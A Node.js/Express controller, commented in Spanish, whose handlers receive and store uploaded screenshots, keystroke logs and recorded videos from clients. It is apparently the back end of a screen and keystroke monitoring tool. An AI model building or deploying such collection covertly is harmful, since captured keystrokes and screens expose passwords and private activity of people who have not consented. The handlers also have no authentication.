const fs = require("fs-extra")
const path = require("path")
const multer = require("multer")

// 📁 BASE UNIFICADA DE UPLOADS (DENTRO DE src/uploads)
const UPLOADS = path.resolve(__dirname, "../uploads")

const SCREENSHOTS_DIR = path.join(UPLOADS, "screenshots")
const KEYSTROKES_DIR = path.join(UPLOADS, "keystrokes")
const VIDEOS_DIR = path.join(UPLOADS, "videos")

// 📸 SCREENSHOTS
exports.saveScreenshot = async (req, res) => {
  try {
    console.log("📸 BODY screenshot recibido")

    const { image } = req.body

    if (!image) {
      return res.status(400).json({ error: "image vacío" })
    }

    const base64 = image.split(",")[1]

    if (!base64) {
      return res.status(400).json({ error: "base64 inválido" })
    }

    await fs.ensureDir(SCREENSHOTS_DIR)

    const fileName = `shot-${Date.now()}.png`
    const filePath = path.join(SCREENSHOTS_DIR, fileName)

    await fs.writeFile(filePath, base64, "base64")

    console.log("📁 screenshot guardado en:", filePath)

    res.json({ ok: true, file: fileName })

  } catch (err) {
    console.error("❌ error screenshot:", err)
    res.status(500).json({ error: err.message })
  }
}


// ⌨️ KEYSTROKES
exports.saveKeystrokes = async (req, res) => {
  try {
    console.log("⌨️ BODY keystrokes recibido:", req.body)

    const { logs } = req.body

    if (!logs || !Array.isArray(logs)) {
      return res.status(400).json({ error: "logs inválidos" })
    }

    await fs.ensureDir(KEYSTROKES_DIR)

    const fileName = `keys-${Date.now()}.json`
    const filePath = path.join(KEYSTROKES_DIR, fileName)

    await fs.writeJson(filePath, logs)

    console.log("📁 keystrokes guardado en:", filePath)

    res.json({ ok: true, file: fileName })

  } catch (err) {
    console.error("❌ error keystrokes:", err)
    res.status(500).json({ error: err.message })
  }
}


// 🎥 VIDEO (multer)
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, VIDEOS_DIR)
  },
  filename: (req, file, cb) => {
    cb(null, `video-${Date.now()}.webm`)
  }
})

const upload = multer({ storage })

exports.uploadMiddleware = upload.single("video")

exports.saveVideo = (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "video vacío" })
    }

    console.log("🎥 video guardado:", req.file.filename)

    res.json({
      ok: true,
      file: req.file.filename
    })

  } catch (err) {
    console.error("❌ error video:", err)
    res.status(500).json({ error: err.message })
  }
}